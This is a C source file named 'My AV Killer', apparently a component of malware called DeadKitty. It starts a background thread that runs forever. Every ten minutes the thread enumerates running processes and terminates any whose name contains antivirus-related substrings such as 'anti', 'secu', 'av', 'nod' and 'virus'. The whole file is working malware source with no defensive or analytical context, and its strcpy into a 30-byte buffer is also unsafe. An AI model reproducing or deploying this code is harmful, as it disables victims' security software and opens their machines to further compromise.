   /* My AV Killer */

   #include "DeadKitty.h"


   #define LIST_NUM_ENTRIES 9

   /* my blacklist :) */
   const char *BadProcesses[] = {
       "anti",
       "secu",
       "fp",
       "f-",
       "av",
       "nav",
       "scan",
       "nod",
       "virus"
   };


   DWORD WINAPI Th_AVKiller(LPVOID DATA)
   {
       PROCESSENTRY32 PE32;
       HANDLE SnapShot;
       HANDLE Terminate;
       int BadCnt;
       char CurrentExe[30]; /* it should be enough */

       while(1)
       {
           if((SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)) == -1)
           {
               /* I can't avoid this */
               ExitProcess(0);
           }

           PE32.dwSize = sizeof(PE32);

           if(!Process32First(SnapShot,&PE32))
           {
               ExitProcess(0);
           }

           /* the scanner part */
           do
           {

               if(GetCurrentProcessId() != PE32.th32ProcessID)
               {
                   for(BadCnt = 0;BadCnt < LIST_NUM_ENTRIES;BadCnt++)
                   {
                       strcpy(CurrentExe,PE32.szExeFile);
                       my_strlower(CurrentExe);

                       if(strstr(CurrentExe,BadProcesses[BadCnt]))
                       {
                           /* Try to open the process */
                           if((Terminate = OpenProcess(PROCESS_TERMINATE,FALSE,
                               PE32.th32ProcessID)) != NULL)
                           {
                               TerminateProcess(Terminate,0);
                               CloseHandle(Terminate);
                           }
                       }
                   }
               }
           } while(Process32Next(SnapShot,&PE32));

           CloseHandle(SnapShot);

           WAIT(10); /* every 10 minutes */

       }


   }

   void AVKiller(void)
   {
       DWORD KillAvId;

       /* start thread */
       CreateThread(NULL,0,&Th_AVKiller,0,0,&KillAvId);
   }
